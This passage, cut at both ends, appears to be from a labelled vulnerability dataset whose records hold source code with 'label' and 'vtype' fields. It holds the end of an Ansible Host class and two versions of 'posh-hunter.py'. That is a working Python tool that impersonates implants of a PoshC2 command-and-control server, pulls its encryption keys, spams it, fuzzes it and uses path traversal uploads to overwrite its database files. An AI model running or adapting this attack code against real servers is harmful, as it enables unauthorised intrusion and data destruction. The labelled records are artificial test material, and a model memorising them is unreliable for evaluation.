name=self.name,\n            vars=self.vars.copy(),\n            address=self.address,\n            uuid=self._uuid,\n            groups=groups,\n            implicit=self.implicit,\n        )\n\n    def deserialize(self, data):\n        self.__init__(gen_uuid=False)\n\n        self.name = data.get('name')\n        self.vars = data.get('vars', dict())\n        self.address = data.get('address', '')\n        self._uuid = data.get('uuid', None)\n        self.implicit = data.get('implicit', False)\n\n        groups = data.get('groups', [])\n        for group_data in groups:\n            g = Group()\n            g.deserialize(group_data)\n            self.groups.append(g)\n\n    def __init__(self, name=None, port=None, gen_uuid=True):\n\n        self.vars = {}\n        self.groups = []\n        self._uuid = None\n\n        self.name = name\n        self.address = name\n\n        if port:\n            self.set_variable('ansible_port', int(port))\n\n        if gen_uuid:\n            self._uuid = get_unique_id()\n        self.implicit = False\n\n    def get_name(self):\n        return self.name\n\n    def populate_ancestors(self):\n        # populate ancestors\n        for group in self.groups:\n            self.add_group(group)\n\n    def add_group(self, group):\n\n        # populate ancestors first\n        for oldg in group.get_ancestors():\n            if oldg not in self.groups:\n                self.add_group(oldg)\n\n        # actually add group\n        if group not in self.groups:\n            self.groups.append(group)\n\n    def remove_group(self, group):\n\n        if group in self.groups:\n            self.groups.remove(group)\n\n            # remove exclusive ancestors, xcept all!\n            for oldg in group.get_ancestors():\n                if oldg.name != 'all':\n                    for childg in self.groups:\n                        if oldg in childg.get_ancestors():\n                            break\n                    else:\n                        self.remove_group(oldg)\n\n    def set_variable(self, key, value):\n        self.vars[key] = value\n\n    def get_groups(self):\n        return self.groups\n\n    def get_magic_vars(self):\n        results = {}\n        results['inventory_hostname'] = self.name\n        results['inventory_hostname_short'] = self.name.split('.')[0]\n        results['group_names'] = sorted([g.name for g in self.get_groups() if g.name != 'all'])\n\n        return results\n\n    def get_vars(self):\n        return combine_vars(self.vars, self.get_magic_vars())\n/n/n/n", "label": 1, "vtype": "path_disclosure"}, {"id": "e523c6418720a20eb247111d21424752f6994ee0", "code": "posh-hunter.py/n/n#!/usr/bin/env python\n# Find, monitor and troll a PoshC2 server\n\nimport zlib, argparse, os, sys, re, requests, subprocess, datetime, time, base64\n\nclass PoshC2Payload:\n  \n  filepath = None\n  useragent = None\n  secondstage = None\n  encryptionkey = None\n\n  def __init__( self, path ):\n    if not os.path.isfile( path ):\n      print path + ' isn\\'t a file'\n\n    self.filepath = path\n\n  # Attempt to pull info out of implant payload\n  def analyse( self ):\n    print 'Analysing ' + self.filepath + '...'\n\n    with open( self.filepath, 'rb' ) as f:\n      decoded = PoshC2Payload.base64_walk( f.read() )\n  \n    # print decoded\n\n    # Get custom headers\n    headernames = [\n      'User-Agent',\n      'Host',\n      'Referer'\n    ]\n    self.headers = {}\n    for h in headernames:\n      m = re.search( h + '\",\"([^\"]*)\"', decoded, re.IGNORECASE )\n      if m:\n        print h + ': ' + m.group(1)\n        self.headers[h] = m.group(1)\n\n    # Get host header\n    m = re.search('\\$h=\"([^\"]*)\"', decoded )\n    if m:\n      self.headers['Host'] = m.group(1)\n      print 'Host header: ' + m.group(1)\n\n    # Get second stage URL\n    m = re.search('\\$s=\"([^\"]*)\"', decoded )\n    if m:\n      self.secondstage = m.group(1)\n      print 'Second stage URL: ' + self.secondstage\n    \n    # Get encryption key\n    m = re.search('-key ([/+a-z0-9A-Z]*=*)', decoded )\n    if m:\n      self.encryptionkey = m.group(1)\n      print 'Encryption key: ' + self.encryptionkey\n\n    c2 = PoshC2Server()\n    c2.key = self.encryptionkey\n    c2.useragent = self.headers['User-Agent']\n    return c2\n\n  # Recursively attempt to extract and decode base64\n  @staticmethod\n  def base64_walk( data ):\n\n    # data = data.decode('utf-16le').encode('utf-8')\n\n    # Convert by stripping zero bytes, lol\n    s = ''\n    for c in data:\n      if ord( c ) != 0:\n        s += c\n    data = s\n    # print ''\n    # print 'Attempting to get data from: ' + data\n\n    # Find all base64 strings\n    m = re.findall( r'[+/0-9a-zA-Z]{20,}=*', data )\n    \n    if len( m ) == 0:\n      print 'No more base64 found'\n      return data\n\n    # Join into one string\n    b64 = ''.join(m)\n    # print 'Found: ' + b64\n    \n    decoded = base64.b64decode( b64 )\n\n    # Deflated?\n    decompress = zlib.decompressobj(\n      -zlib.MAX_WBITS  # see above\n    )\n    try:\n      d = decompress.decompress( decoded )\n      if d:\n        print 'Data is compressed'\n        decoded = d\n    except:\n      print 'Data is not compressed'\n\n    # Check if the data now contains a user agent, URL \n    m = re.search(r'user-agent',decoded,re.IGNORECASE)\n    if m:\n      return decoded\n    \n    return PoshC2Payload.base64_walk( decoded )\n\n\nclass PoshC2Server:\n\n  host = None\n  hostheader = None\n  key = None\n  useragent = None\n  referer = None\n  cookie = None\n  pid = None\n  username = None\n  domain = None\n  debug = False\n  sleeptime = 5\n\n  def __init__( self, host=None, hostheader=None ):\n    \n    self.session = requests.Session()\n    self.host = host\n    if not hostheader:\n      self.hostheader = host\n    else:\n      self.hostheader = hostheader\n\n  def do_request( self, url, data=None ):\n   \n\n    self.debug = False\n\n    # def do_request( self, path, method='GET', data=None, files=None, returnformat='json', savefile=None ):\n    headers = {\n      'Host': self.hostheader,\n      'Referer': self.referer,\n      'User-Agent': self.useragent,\n      'Cookie': self.cookie\n    \n    }\n    # print headers\n\n    import warnings\n    with warnings.catch_warnings():\n      warnings.simplefilter(\"ignore\")\n      try:\n        if data:\n          response = self.session.post(url, data=data, headers=headers, verify=False ) # , files=files, stream=stream )\n        else:\n          response = self.session.get(url, headers=headers, verify=False )\n      except:\n        e = sys.exc_info()[1]\n        print 'Request failed: ' + str( e ), 'fail' \n        return False\n\n    if self.debug: \n      print response\n      print response.text   \n    if response.status_code == 200:\n      return response.text\n    self.error = response\n    if self.debug:\n      print self.error\n    return False\n\n  def get_encryption( self, iv='0123456789ABCDEF' ):\n    from Crypto.Cipher import AES\n    # print 'IV: ', iv\n    aes = AES.new( base64.b64decode(self.key), AES.MODE_CBC, iv )\n    return aes\n\n  # Encrypt a string and base64 encode it\n  def encrypt( self, data, gzip=False ):\n    # function ENC ($key,$un){\n    # $b = [System.Text.Encoding]::UTF8.GetBytes($un)\n    # $a = CAM $key\n    # $e = $a.CreateEncryptor()\n    # $f = $e.TransformFinalBlock($b, 0, $b.Length)\n    # [byte[]] $p = $a.IV + $f\n    # [System.Convert]::ToBase64String($p)\n    # }\n\n    if gzip:\n      print 'Gzipping data - pre-zipped len, ' + str(len(data))\n      import StringIO\n      import gzip\n      out = StringIO.StringIO()\n      with gzip.GzipFile(fileobj=out, mode=\"w\") as f:\n        f.write(data)\n      data = out.getvalue() \n\n    # Pad with zeros\n    mod = len(data) % 16\n    if mod != 0:\n      newlen = len(data) + (16-mod)\n      data = data.ljust( newlen, '\\0' )\n    aes = self.get_encryption()\n    # print 'Data len: ' + str(len(data))\n    data = aes.IV + aes.encrypt( data )\n    if not gzip:\n      data = base64.b64encode( data )\n    return data\n\n  # Decrypt a string from base64 encoding \n  def decrypt( self, data, gzip=False ):\n    # iv is first 16 bytes of cipher\n    print data\n    iv = data[0:16]\n    # data = data[16:]\n    # print 'IV length: ' + str(len(iv))\n    aes = self.get_encryption(iv)\n    if not gzip:\n      data = base64.b64decode(data)\n    data =  aes.decrypt( data )\n    if gzip:\n      print 'Gunzipping data - pre-zipped len, ' + str(len(data))\n      import StringIO\n      import gzip\n      infile = StringIO.StringIO(data)\n      with gzip.GzipFile(fileobj=infile, mode=\"r\") as f:\n        data = f.read()\n    return data[16:]\n  \n  def setcookie( self, value=None ):\n    if value:\n      c = value\n    else:\n    # $o=\"$env:userdomain\\$u;$u  ;$env:computername;$env:PROCESSOR_ARCHITECTURE;$pid;http://172.16.88.221\"\n      if not self.pid:\n        import random\n        self.pid = random.randrange(300,9999)\n      c = self.domain + '\\\\'\n      c += self.username + ';'\n      c += self.username + ';' \n      c += self.machine + ';AMD64;' \n      c += str( self.pid ) + ';' \n      c += self.host\n    print c\n    self.cookie = 'SessionId=' + self.encrypt( c )\n    # print self.cookie\n\n  # Get the second stage\n  def secondstage( self, url, interact=False ):\n    \n    # $o=\"$env:userdomain\\$u;$u;$env:computername;$env:PROCESSOR_ARCHITECTURE;$pid;https://172.16.88.221\"\n    # $pp=enc -key sBOGMbI+wTzxiN9H8q8y8YFBuD/KGsmvCnwRhDjPVXE= -un $o\n    # $primer = (Get-Webclient -Cookie $pp).downloadstring($s)\n    self.host = '/'.join(url.split('/')[0:3])\n    self.setcookie()\n    data = self.do_request( url )\n    data = self.decrypt( data )\n\n    print data\n\n    # Get encryption key, URL\n    m = re.search( r'\\$key *= *\"([^\"]+)\"', data )\n    if m:\n      print 'Comms encryption key: ' + m.group(1)\n      self.key = m.group(1)\n    m = re.search(r'\\$Server *= *\"([^\"]+)\"', data )\n    if m:\n      print 'Comms URL: ' + m.group(1)\n      self.commsurl = m.group(1)\n    m = re.search(r'\\$sleeptime *= *([0-9]+)', data )\n    if m:\n      print 'Sleep time: ' + m.group(1)\n      self.sleeptime = int(m.group(1))\n\n    if not interact: return True\n    \n    self.listen( self.commsurl )\n\n  def getimgdata( self, data ):\n    # Just use one image because we don't care\n    imagebytes = base64.b64decode('iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAACAUlEQVR42rWXi7WCMAyG2xGcRUfQEXAE7wgyAq7gCDqCjiCruAK3f2162pDSlkfOQaRA8+VPH0Grehvw03WdvXi/3/Y4Ho/+Gv9xtG2rc51lH+DOjanT6eSd4RpGba/Xy55vtxsAsj5qAKxzrbV3ajvQvy5IETiV7kMRAzzyNwuA5OYqhE6pDUrgGSgDlTiECGCiGSi3rN1G+HGdt78OI6AUFKWJj40IwNwcSK7r9Rq9TJFwKFgI1JlIDyxNHCJUIQSI3kC0HIIbYPq+H4GRcy2AuDERAyByKbISiJSFuZ8EQL7ddBEtJWXOdCINI4BU9EtVKAZQLPfcMCC5jCXGFybJ+aYABMHUFReizQAiR0L0tmGrMVAMMDULaEHiK92qAO4spgHSr+G8BCCCWDPyGgALsWbUcwD8TgibGpykVOkMkbZiEWDChtEm83dQ+t5nl2tpG14MUKMCnne1xDIAGhvcIXY+bMuPxyMJkPJVCmBD/5jj7g5uTdMkX34+n/NqQlqkQukv7t5F1VlbC0DlGZcbAwptkB1WOmNS/lIAQziyQ6dQpHR/OJ/Par/f+2epok7VhKJzihSd2OlnBoI+zK+UCIR8j1bC7/erdrvdKHqCqVGgBMIDSDkPo59rmAHSDKGiNdqMuKxh9HMs9z5U8Ntx6ktmSTkmfeCIALmqaEv7B/CgdPivPO+zAAAAAElFTkSuQmCC')     \n    maxbyteslen = 1500\n    maxdatalen = 1500 + len( data )\n    imagebyteslen = len(imagebytes)\n    paddingbyteslen = maxbyteslen - imagebyteslen\n    bytepadding = '.'.ljust(paddingbyteslen,'.')\n    imagebytesfull = imagebytes + bytepadding + data\n    return imagebytesfull\n\n  def uploadfile( self, localpath, remotepath, data=None ):\n    c = 'download-file '+remotepath\n    self.setcookie(c)\n    if data:\n      filedata = data\n    else:\n      with open( localpath, 'rb' ) as f:\n        filedata = f.read()\n\n  #         $bufferSize = 10737418;\n  #             $preNumbers = ($ChunkedByte+$totalChunkByte)\n  #             $send = Encrypt-Bytes $key ($preNumbers+$chunkBytes)\n    buffersize = 10737418\n    filesize = len( filedata )\n    chunksize = filesize / buffersize\n    import math\n    totalchunks = int(math.ceil(chunksize))\n    if totalchunks < 1: totalchunks = 1\n    totalchunkstr = str( totalchunks ).rjust(5,'0')\n    chunk = 1\n    start = 0\n    while chunk <= totalchunks:\n      chunkstr = str( chunk ).rjust(5,'0')\n      prenumbers=chunkstr + totalchunkstr\n      chunkdata = filedata[start:start+buffersize]\n      chunk+=1\n      start += buffersize\n      send = self.encrypt( prenumbers + chunkdata, gzip=True )\n      uploadbytes = self.getimgdata( send )\n      print 'Chunk data: ' + chunkdata\n      print 'Prenumbers: ' + prenumbers\n      print 'Imgdata: ' + uploadbytes\n      response = self.do_request( self.commsurl, uploadbytes )\n      # print response\n      if len(response.strip()) > 0:\n        print self.decrypt( response )\n    return False  \n\n  def wipedb( self ):\n    print 'Wiping their DB...'\n    self.uploadfile( None, '..\\PowershellC2.SQLite', 'Appended data' )\n    self.uploadfile( None, '..\\oops.txt', 'oopsy' )\n    self.uploadfile( None, '..\\Restart-C2Server.lnk', 'oopsy' )\n\n  # Listen to incoming commands\n  def listen( self, url ):\n    print 'Listening to server on comms URL: ' + url\n    fmt = '%Y-%m-%d %H:%M:%S'\n    while True:\n      self.setcookie( '' )\n      data = self.do_request( url )\n      if len( data.strip() ) > 0:\n        try:\n          cmd = self.decrypt( data )\n        except:\n          print 'Decrypting response failed: ' + data\n        out = ''\n        if 'fvdsghfdsyyh' in cmd:\n          out = 'No command...'\n        elif '!d-3dion@LD!-d' in cmd:\n          out = '\\n'.join(cmd.split('!d-3dion@LD!-d'))\n        else: \n          out = cmd\n      else:\n        out = 'No command...'\n\n      print datetime.datetime.now().strftime(fmt) + ': ' + out\n      time.sleep( self.sleeptime )\n    return False\n\n  # rickroll the server\n  def rickroll( self, url ):\n    thisdir = os.path.dirname(os.path.realpath(__file__))\n    wordsfile = thisdir + '/nevergonna.txt'\n    self.username = 'rastley'\n    self.domain = 'SAW'\n    self.host = 'https://bitly.com/98K8eH'\n    self.spam( wordsfile, url )\n \n  # Spray the contents of a txt file at the server as machine names\n  def spam( self, wordsfile, url ):\n    try:\n      with open( wordsfile, 'r' ) as f:\n        lines = f.readlines()\n    except:\n      print 'Failed to open ' + wordsfile\n      return False\n\n    for line in lines:\n      line = line.strip() # re.sub( '[^-0-9a-zA-Z ]', '', line.strip() ).replace(' ','-')\n      self.machine = line\n      key = self.key\n      self.secondstage( url )\n      self.pid = None\n      self.key = key\n    return True\n  \n  # Connect with random keys, forever\n  def fuzz( self, secondstage ):\n    import random\n    while True:\n      c = b''\n      for i in range( 0, 16 ):\n        c += unichr( random.randint(0, 127 ) )\n      self.key = base64.b64encode( c )\n      self.secondstage( secondstage )\n\n        \n\ndef main():\n  \n  # Command line options\n  parser = argparse.ArgumentParser(description=\"Find, monitor and troll a PoshC2 server\")\n  parser.add_argument(\"-a\", \"--analyse\", help=\"Analyse an implant payload to discover C2 server\")\n  parser.add_argument(\"-k\", \"--key\", help=\"Comms encryption key\" )\n  parser.add_argument(\"-U\", \"--useragent\", help=\"User-agent string\" )\n  parser.add_argument(\"-r\", \"--referer\", help=\"Referer string\" )\n  parser.add_argument(\"-H\", \"--host\", help=\"Host name to connect to\" )\n  parser.add_argument(\"-g\", \"--hostheader\", help=\"Host header for domain fronted servers\")\n  parser.add_argument(\"-d\", \"--domain\", default='WORKGROUP', help=\"Windows domain name to claim to be in\")\n  parser.add_argument(\"-u\", \"--user\", default='user', help=\"Windows user to claim to be connecting as\")\n  parser.add_argument(\"-m\", \"--machine\", default='DESKTOP', help=\"Machine hostname to claim to be connecting as\")\n  parser.add_argument(\"--connect\", action='store_true', help=\"Connect to the C2 as a new implant then quit\")\n  parser.add_argument(\"--watch\", action='store_true', help=\"Connect and monitor commands as they come in\")\n\n  parser.add_argument(\"--spam\", metavar=\"TEXTFILE\", help=\"Spam the connected implants screen with content from this text file\")\n  parser.add_argument(\"--rickroll\", action='store_true', help=\"Spam with the entire lyrics to Never Gonna Give You Up\")\n  parser.add_argument(\"--upload\", nargs=2, help=\"Upload a file to the C2 server (NOTE: this writes data from the local file to the remote file in APPEND mode)\")\n  parser.add_argument(\"--fuzz\", action='store_true', help=\"Fuzz with random bytes\")\n  if len( sys.argv)==1:\n    parser.print_help()\n    sys.exit(1)\n  args = parser.parse_args()\n\n  if args.analyse:\n    payload = PoshC2Payload( args.analyse )   \n    c2 = payload.analyse()\n    secondstage = payload.secondstage\n  else:\n    c2 = PoshC2Server()\n    c2.useragent = args.useragent\n    c2.referer = args.referer\n    c2.key = args.key\n    c2.host = args.host\n  c2.domain = args.domain\n  c2.username = args.user\n  c2.machine = args.machine\n\n  if args.connect:\n    c2.secondstage( secondstage )\n    return True\n\n  if args.watch:\n    c2.secondstage( secondstage, interact=True )\n    return True\n\n  if args.rickroll:\n    c2.rickroll( payload.secondstage )\n    return True\n\n  if args.upload:\n    c2.secondstage( secondstage )\n    c2.uploadfile( args.upload[0], args.upload[1] ) \n\n  if args.fuzz:\n    c2.fuzz( secondstage )\n\nif __name__ == \"__main__\":\n  main()\n/n/n/n", "label": 0, "vtype": "path_disclosure"}, {"id": "e523c6418720a20eb247111d21424752f6994ee0", "code": "/posh-hunter.py/n/n#!/usr/bin/env python\n# Find, monitor and troll a PoshC2 server\n\nimport zlib, argparse, os, sys, re, requests, subprocess, datetime, time, base64\n\nclass PoshC2Payload:\n  \n  filepath = None\n  useragent = None\n  secondstage = None\n  encryptionkey = None\n\n  def __init__( self, path ):\n    if not os.path.isfile( path ):\n      print path + ' isn\\'t a file'\n\n    self.filepath = path\n\n  # Attempt to pull info out of implant payload\n  def analyse( self ):\n    print 'Analysing ' + self.filepath + '...'\n\n    with open( self.filepath, 'rb' ) as f:\n      decoded = PoshC2Payload.base64_walk( f.read() )\n  \n    # print decoded\n\n    # Get custom headers\n    headernames = [\n      'User-Agent',\n      'Host',\n      'Referer'\n    ]\n    self.headers = {}\n    for h in headernames:\n      m = re.search( h + '\",\"([^\"]*)\"', decoded, re.IGNORECASE )\n      if m:\n        print h + ': ' + m.group(1)\n        self.headers[h] = m.group(1)\n\n    # Get host header\n    m = re.search('\\$h=\"([^\"]*)\"', decoded )\n    if m:\n      self.headers['Host'] = m.group(1)\n      print 'Host header: ' + m.group(1)\n\n    # Get second stage URL\n    m = re.search('\\$s=\"([^\"]*)\"', decoded )\n    if m:\n      self.secondstage = m.group(1)\n      print 'Second stage URL: ' + self.secondstage\n    \n    # Get encryption key\n    m = re.search('-key ([/+a-z0-9A-Z]*=*)', decoded )\n    if m:\n      self.encryptionkey = m.group(1)\n      print 'Encryption key: ' + self.encryptionkey\n\n    c2 = PoshC2Server()\n    c2.key = self.encryptionkey\n    return c2\n\n  # Recursively attempt to extract and decode base64\n  @staticmethod\n  def base64_walk( data ):\n\n    # data = data.decode('utf-16le').encode('utf-8')\n\n    # Convert by stripping zero bytes, lol\n    s = ''\n    for c in data:\n      if ord( c ) != 0:\n        s += c\n    data = s\n    # print ''\n    # print 'Attempting to get data from: ' + data\n\n    # Find all base64 strings\n    m = re.findall( r'[+/0-9a-zA-Z]{20,}=*', data )\n    \n    if len( m ) == 0:\n      print 'No more base64 found'\n      return data\n\n    # Join into one string\n    b64 = ''.join(m)\n    # print 'Found: ' + b64\n    \n    decoded = base64.b64decode( b64 )\n\n    # Deflated?\n    decompress = zlib.decompressobj(\n      -zlib.MAX_WBITS  # see above\n    )\n    try:\n      d = decompress.decompress( decoded )\n      if d:\n        print 'Data is compressed'\n        decoded = d\n    except:\n      print 'Data is not compressed'\n\n    # Check if the data now contains a user agent, URL \n    m = re.search(r'user-agent',decoded,re.IGNORECASE)\n    if m:\n      return decoded\n    \n    return PoshC2Payload.base64_walk( decoded )\n\n\nclass PoshC2Server:\n\n  host = None\n  hostheader = None\n  key = None\n  useragent = None\n  referer = None\n  cookie = None\n  pid = None\n  username = None\n  domain = None\n  cookies = None\n  debug = False\n  sleeptime = 5\n\n  def __init__( self, host=None, hostheader=None ):\n    \n    self.session = requests.Session()\n    self.host = host\n    if not hostheader:\n      self.hostheader = host\n    else:\n      self.hostheader = hostheader\n\n  def do_request( self, url, data=None ):\n    \n    # def do_request( self, path, method='GET', data=None, files=None, returnformat='json', savefile=None ):\n    headers = {\n      'Host': self.hostheader,\n      'Referer': self.referer,\n      'User-Agent': self.useragent,\n      'Cookie': self.cookie\n    }\n    if len(self.session.cookies) > 0:\n      cookies = requests.utils.dict_from_cookiejar(self.session.cookies)\n      cookies['SessionID'] = self.cookie\n      print 'Including cookies'\n      print self.cookie\n\n    try:\n      if data:\n        response = self.session.post(url, data=data, headers=headers, verify=False ) # , files=files, stream=stream )\n      else:\n        response = self.session.get(url, headers=headers, verify=False )\n    except:\n      e = sys.exc_info()[1]\n      print 'Request failed: ' + str( e ), 'fail' \n      return False\n\n    if self.debug: \n      print response\n      print response.text   \n    if response.status_code == 200:\n      return response.text\n    self.error = response\n    if self.debug:\n      print self.error\n    return False\n\n  def get_encryption( self, iv='0123456789ABCDEF' ):\n    from Crypto.Cipher import AES\n    aes = AES.new( base64.b64decode(self.key), AES.MODE_CBC, iv )\n    return aes\n\n  # Encrypt a string and base64 encode it\n  def encrypt( self, data, gzip=False ):\n    # function ENC ($key,$un){\n    # $b = [System.Text.Encoding]::UTF8.GetBytes($un)\n    # $a = CAM $key\n    # $e = $a.CreateEncryptor()\n    # $f = $e.TransformFinalBlock($b, 0, $b.Length)\n    # [byte[]] $p = $a.IV + $f\n    # [System.Convert]::ToBase64String($p)\n    # }\n\n    if gzip:\n      print 'Gzipping data - pre-zipped len, ' + str(len(data))\n      import StringIO\n      import gzip\n      out = StringIO.StringIO()\n      with gzip.GzipFile(fileobj=out, mode=\"w\") as f:\n        f.write(data)\n      data = out.getvalue() \n\n    # Pad with zeros\n    mod = len(data) % 16\n    if mod != 0:\n      newlen = len(data) + (16-mod)\n      data = data.ljust( newlen, '\\0' )\n    aes = self.get_encryption()\n    # print 'Data len: ' + str(len(data))\n    data = aes.IV + aes.encrypt( data )\n    if not gzip:\n      data = base64.b64encode( data )\n    return data\n\n  # Decrypt a string from base64 encoding \n  def decrypt( self, data, gzip=False ):\n    # iv is first 16 bytes of cipher\n    iv = data[0:16]\n    # data = data[16:]\n    # print 'IV length: ' + str(len(iv))\n    aes = self.get_encryption(iv)\n    if not gzip:\n      data = base64.b64decode(data)\n    data =  aes.decrypt( data )\n    if gzip:\n      print 'Gunzipping data - pre-zipped len, ' + str(len(data))\n      import StringIO\n      import gzip\n      infile = StringIO.StringIO(data)\n      with gzip.GzipFile(fileobj=infile, mode=\"r\") as f:\n        data = f.read()\n    return data[16:]\n  \n  def setcookie( self, value=None ):\n    if value:\n      c = value\n    else:\n    # $o=\"$env:userdomain\\$u;$u  ;$env:computername;$env:PROCESSOR_ARCHITECTURE;$pid;http://172.16.88.221\"\n      if not self.pid:\n        import random\n        self.pid = random.randrange(300,9999)\n      c = self.domain + '\\\\'\n      c += self.username + ';'\n      c += self.username + ';' \n      c += self.machine + ';AMD64;' \n      c += str( self.pid ) + ';' \n      c += self.host\n    print c\n    self.cookie = 'SessionId=' + self.encrypt( c )\n    print self.cookie\n\n  # Get the second stage\n  def secondstage( self, url, interact=False ):\n    \n    # $o=\"$env:userdomain\\$u;$u;$env:computername;$env:PROCESSOR_ARCHITECTURE;$pid;https://172.16.88.221\"\n    # $pp=enc -key sBOGMbI+wTzxiN9H8q8y8YFBuD/KGsmvCnwRhDjPVXE= -un $o\n    # $primer = (Get-Webclient -Cookie $pp).downloadstring($s)\n    self.host = '/'.join(url.split('/')[0:3])\n    self.setcookie()\n    data = self.do_request( url )\n    data = self.decrypt( data )\n\n    # print data\n\n    # Get encryption key, URL\n    m = re.search( r'\\$key *= *\"([^\"]+)\"', data )\n    if m:\n      print 'Comms encryption key: ' + m.group(1)\n      self.key = m.group(1)\n    m = re.search(r'\\$Server *= *\"([^\"]+)\"', data )\n    if m:\n      print 'Comms URL: ' + m.group(1)\n      self.commsurl = m.group(1)\n    m = re.search(r'\\$sleeptime *= *([0-9]+)', data )\n    if m:\n      print 'Sleep time: ' + m.group(1)\n      self.sleeptime = int(m.group(1))\n\n    if not interact: return True\n    \n    self.listen( self.commsurl )\n\n  def getimgdata( self, data ):\n    # Just use one image because we don't care\n    imagebytes = base64.b64decode('iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAACAUlEQVR42rWXi7WCMAyG2xGcRUfQEXAE7wgyAq7gCDqCjiCruAK3f2162pDSlkfOQaRA8+VPH0Grehvw03WdvXi/3/Y4Ho/+Gv9xtG2rc51lH+DOjanT6eSd4RpGba/Xy55vtxsAsj5qAKxzrbV3ajvQvy5IETiV7kMRAzzyNwuA5OYqhE6pDUrgGSgDlTiECGCiGSi3rN1G+HGdt78OI6AUFKWJj40IwNwcSK7r9Rq9TJFwKFgI1JlIDyxNHCJUIQSI3kC0HIIbYPq+H4GRcy2AuDERAyByKbISiJSFuZ8EQL7ddBEtJWXOdCINI4BU9EtVKAZQLPfcMCC5jCXGFybJ+aYABMHUFReizQAiR0L0tmGrMVAMMDULaEHiK92qAO4spgHSr+G8BCCCWDPyGgALsWbUcwD8TgibGpykVOkMkbZiEWDChtEm83dQ+t5nl2tpG14MUKMCnne1xDIAGhvcIXY+bMuPxyMJkPJVCmBD/5jj7g5uTdMkX34+n/NqQlqkQukv7t5F1VlbC0DlGZcbAwptkB1WOmNS/lIAQziyQ6dQpHR/OJ/Par/f+2epok7VhKJzihSd2OlnBoI+zK+UCIR8j1bC7/erdrvdKHqCqVGgBMIDSDkPo59rmAHSDKGiNdqMuKxh9HMs9z5U8Ntx6ktmSTkmfeCIALmqaEv7B/CgdPivPO+zAAAAAElFTkSuQmCC')     \n    maxbyteslen = 1500\n    maxdatalen = 1500 + len( data )\n    imagebyteslen = len(imagebytes)\n    paddingbyteslen = maxbyteslen - imagebyteslen\n    bytepadding = '.'.ljust(paddingbyteslen,'.')\n    imagebytesfull = imagebytes + bytepadding + data\n    return imagebytesfull\n\n  def uploadfile( self, localpath, remotepath, data=None ):\n    c = 'download-file '+remotepath\n    self.setcookie(c)\n    if data:\n      filedata = data\n    else:\n      with open( localpath, 'rb' ) as f:\n        filedata = f.read()\n\n  #         $bufferSize = 10737418;\n  #             $preNumbers = ($ChunkedByte+$totalChunkByte)\n  #             $send = Encrypt-Bytes $key ($preNumbers+$chunkBytes)\n    buffersize = 10737418\n    filesize = len( filedata )\n    chunksize = filesize / buffersize\n    import math\n    totalchunks = int(math.ceil(chunksize))\n    if totalchunks < 1: totalchunks = 1\n    totalchunkstr = str( totalchunks ).rjust(5,'0')\n    chunk = 1\n    start = 0\n    while chunk <= totalchunks:\n      chunkstr = str( chunk ).rjust(5,'0')\n      prenumbers=chunkstr + totalchunkstr\n      chunkdata = filedata[start:start+buffersize]\n      chunk+=1\n      start += buffersize\n      send = self.encrypt( prenumbers + chunkdata, gzip=True )\n      uploadbytes = self.getimgdata( send )\n      print 'Chunk data: ' + chunkdata\n      print 'Prenumbers: ' + prenumbers\n      print 'Imgdata: ' + uploadbytes\n      response = self.do_request( self.commsurl, uploadbytes )\n      print response\n      if len(response.strip()) > 0:\n        print self.decrypt( response )\n    return False  \n\n  def wipedb( self ):\n    print 'Wiping their DB...'\n    self.uploadfile( None, '..\\PowershellC2.SQLite', 'Appended data' )\n    self.uploadfile( None, '..\\oops.txt', 'oopsy' )\n    self.uploadfile( None, '..\\Restart-C2Server.lnk', 'oopsy' )\n\n  # Listen to incoming commands\n  def listen( self, url ):\n    print 'Listening to server on comms URL: ' + url\n    fmt = '%Y-%m-%d %H:%M:%S'\n    while True:\n      data = self.do_request( url )\n      cmd = self.decrypt( data )\n      out = ''\n      if 'fvdsghfdsyyh' in cmd:\n        out = 'No command...'\n      elif '!d-3dion@LD!-d' in cmd:\n        out = '\\n'.join(cmd.split('!d-3dion@LD!-d'))\n      else: \n        out = cmd\n\n      print datetime.datetime.now().strftime(fmt) + ': ' + out\n      time.sleep( self.sleeptime )\n    return False\n\n  # rickroll the server\n  def rickroll( self, url ):\n    thisdir = os.path.dirname(os.path.realpath(__file__))\n    wordsfile = thisdir + '/nevergonna.txt'\n    self.username = 'rastley'\n    self.domain = 'SAW'\n    self.host = 'https://bitly.com/98K8eH'\n    self.spam( wordsfile, url )\n \n  # Spray the contents of a txt file at the server as machine names\n  def spam( self, wordsfile, url ):\n    try:\n      with open( wordsfile, 'r' ) as f:\n        lines = f.readlines()\n    except:\n      print 'Failed to open ' + wordsfile\n      return False\n\n    for line in lines:\n      line = line.strip() # re.sub( '[^-0-9a-zA-Z ]', '', line.strip() ).replace(' ','-')\n      self.machine = line\n      key = self.key\n      self.secondstage( url )\n      self.pid = None\n      self.key = key\n    return True\n  \n  # Connect with random keys, forever\n  def fuzz( self, secondstage ):\n    import random\n    while True:\n      c = b''\n      for i in range( 0, 16 ):\n        c += unichr( random.randint(0, 127 ) )\n      self.key = base64.b64encode( c )\n      self.secondstage( secondstage )\n\n        \n\ndef main():\n  \n  # Command line options\n  parser = argparse.ArgumentParser(description=\"Find, monitor and troll a PoshC2 server\")\n  parser.add_argument(\"-a\", \"--analyse\", help=\"Analyse an implant payload to discover C2 server\")\n  parser.add_argument(\"-k\", \"--key\", help=\"Comms encryption key\" )\n  parser.add_argument(\"-U\", \"--useragent\", help=\"User-agent string\" )\n  parser.add_argument(\"-r\", \"--referer\", help=\"Referer string\" )\n  parser.add_argument(\"-H\", \"--host\", help=\"Host name to connect to\" )\n  parser.add_argument(\"-g\", \"--hostheader\", help=\"Host header for domain fronted servers\")\n  parser.add_argument(\"-d\", \"--domain\", default='WORKGROUP', help=\"Windows domain name to claim to be in\")\n  parser.add_argument(\"-u\", \"--user\", default='user', help=\"Windows user to claim to be connecting as\")\n  parser.add_argument(\"-m\", \"--machine\", default='DESKTOP', help=\"Machine hostname to claim to be connecting as\")\n  parser.add_argument(\"--connect\", action='store_true', help=\"Connect to the C2 as a new implant then quit\")\n  parser.add_argument(\"--watch\", action='store_true', help=\"Connect and monitor commands as they come in\")\n\n  parser.add_argument(\"--spam\", metavar=\"TEXTFILE\", help=\"Spam the connected implants screen with content from this text file\")\n  parser.add_argument(\"--rickroll\", action='store_true', help=\"Spam with the entire lyrics to Never Gonna Give You Up\")\n  parser.add_argument(\"--upload\", nargs=2, help=\"Upload a file to the C2 server (NOTE: this writes data from the local file to the remote file in APPEND mode)\")\n  parser.add_argument(\"--fuzz\", action='store_true', 